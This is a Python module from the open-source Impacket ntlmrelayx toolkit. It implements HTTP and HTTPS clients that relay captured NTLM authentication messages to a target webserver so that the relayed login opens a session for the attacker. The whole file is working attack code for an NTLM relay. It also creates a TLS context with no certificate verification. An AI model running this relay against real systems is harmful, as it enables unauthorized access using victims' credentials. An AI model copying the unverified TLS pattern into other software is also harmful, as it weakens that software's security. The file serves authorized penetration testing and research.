# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Protocol Client
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
# Description:
# HTTP(s) client for relaying NTLMSSP authentication to webservers
#
import re
import ssl
from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64

from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]

class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort = 80, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost,self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        return True

    def sendNegotiate(self,negotiateMessage):
        #Check if server wants auth
        self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate'):
                LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            return False

        #Negotiate auth
        negotiate = base64.b64encode(negotiateMessage)
        headers = {'Authorization':'NTLM %s' % negotiate}
        self.session.request('GET', self.path ,headers=headers)
        res = self.session.getresponse()
        res.read()
        try:
            serverChallengeBase64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from server')

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        auth = base64.b64encode(token)
        headers = {'Authorization':'NTLM %s' % auth}
        self.session.request('GET', self.path,headers=headers)
        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned error code %d, treating as a successful login' % res.status)
            #Cache this
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Do a HEAD for favicon.ico
        self.session.request('HEAD','/favicon.ico')
        self.session.getresponse()

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True ):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        return True

